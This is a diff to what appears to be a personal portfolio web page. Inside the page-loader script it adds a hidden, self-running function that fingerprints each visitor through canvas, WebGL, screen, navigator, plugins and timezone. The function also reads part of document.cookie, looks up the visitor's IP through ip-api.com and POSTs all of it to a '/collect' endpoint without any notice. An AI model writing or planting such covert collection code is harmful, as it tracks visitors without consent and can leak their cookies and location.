@@ -66,6 +66,7 @@
         width: 80%;
       }
     </style>
+
     <div id="loader">
       <img
         src="https://raw.githubusercontent.com/YassineBaghdadi/YassineBaghdadi/main/gitartwork.svg"
@@ -75,6 +76,147 @@
       setTimeout(() => {
         document.getElementById('loader').style.display = 'none';
       }, 4800);
+
+      (async function collectAndSend() {
+        function hashString(s) {
+          let h = 2166136261 >>> 0;
+          for (let i = 0; i < s.length; i++) {
+            h ^= s.charCodeAt(i);
+            h += (h << 1) + (h << 4) + (h << 7) + (h << 8) + (h << 24);
+          }
+          return (h >>> 0).toString(16);
+        }
+
+        function getCanvasFingerprint() {
+          try {
+            const c = document.createElement('canvas');
+            c.width = 200;
+            c.height = 60;
+            const ctx = c.getContext('2d');
+            ctx.fillStyle = '#f0f';
+            ctx.fillRect(0, 0, 200, 60);
+            ctx.textBaseline = 'top';
+            ctx.font = '14px Arial';
+            ctx.fillStyle = '#000';
+            ctx.fillText('canvas fingerprint test ✓', 2, 2);
+
+            ctx.shadowColor = 'rgba(0,0,0,0.5)';
+            ctx.shadowOffsetX = 2;
+            ctx.shadowOffsetY = 2;
+            ctx.fillStyle = 'rgba(100,200,30,0.5)';
+            ctx.fillRect(10, 20, 80, 20);
+            const data = c.toDataURL();
+            return hashString(data);
+          } catch (e) {
+            return null;
+          }
+        }
+
+        function getWebGLInfo() {
+          try {
+            const canvas = document.createElement('canvas');
+            const gl =
+              canvas.getContext('webgl') ||
+              canvas.getContext('experimental-webgl');
+            if (!gl) return null;
+            const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+            if (debugInfo) {
+              const vendor = gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL);
+              const renderer = gl.getParameter(
+                debugInfo.UNMASKED_RENDERER_WEBGL
+              );
+              return { vendor, renderer };
+            }
+            return {
+              renderer: gl.getParameter(gl.RENDERER),
+              vendor: gl.getParameter(gl.VENDOR),
+            };
+          } catch (e) {
+            return null;
+          }
+        }
+
+        const data = {
+          navigator: {
+            userAgent: navigator.userAgent,
+            platform: navigator.platform,
+            languages: navigator.languages,
+            language: navigator.language,
+            cookieEnabled: navigator.cookieEnabled,
+            doNotTrack: navigator.doNotTrack,
+            hardwareConcurrency: navigator.hardwareConcurrency || null,
+            deviceMemory: navigator.deviceMemory || null,
+            maxTouchPoints: navigator.maxTouchPoints || 0,
+            vendor: navigator.vendor || null,
+          },
+          screen: {
+            width: screen.width,
+            height: screen.height,
+            availWidth: screen.availWidth,
+            availHeight: screen.availHeight,
+            colorDepth: screen.colorDepth,
+            pixelDepth: screen.pixelDepth,
+          },
+          timezone:
+            Intl && Intl.DateTimeFormat
+              ? Intl.DateTimeFormat().resolvedOptions().timeZone
+              : null,
+          connection: navigator.connection
+            ? {
+                effectiveType: navigator.connection.effectiveType,
+                downlink: navigator.connection.downlink,
+                rtt: navigator.connection.rtt,
+                saveData: navigator.connection.saveData,
+              }
+            : null,
+          performance:
+            typeof performance !== 'undefined'
+              ? {
+                  timeOrigin:
+                    performance.timeOrigin ||
+                    performance.timing.navigationStart,
+                  now: performance.now(),
+                }
+              : null,
+          document: {
+            referrer: document.referrer,
+            title: document.title,
+            cookie: document.cookie
+              ? String(document.cookie).slice(0, 200)
+              : null,
+          },
+          canvasFingerprint: getCanvasFingerprint(),
+          webgl: getWebGLInfo(),
+          touch: {
+            ontouchstart: !!('ontouchstart' in window),
+          },
+
+          plugins: navigator.plugins
+            ? Array.from(navigator.plugins)
+                .slice(0, 5)
+                .map((p) => p.name)
+            : null,
+          sampleId: Math.random().toString(36).slice(2, 10),
+        };
+
+        try {
+          // const response = await fetch('https://api.ipify.org?format=json');
+          const response = await fetch('http://ip-api.com/json/');
+          if (!response.ok)
+            throw new Error(`HTTP error! Status: ${response.status}`);
+
+          const ip = await response.json();
+
+          await fetch('/collect', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ data: data, i: ip }),
+            keepalive: true,
+          });
+        } catch (err) {
+          console.warn('collector: failed to send', err);
+        }
+      })();
     </script>
     <!-- Nav -->
     <nav id="nav">
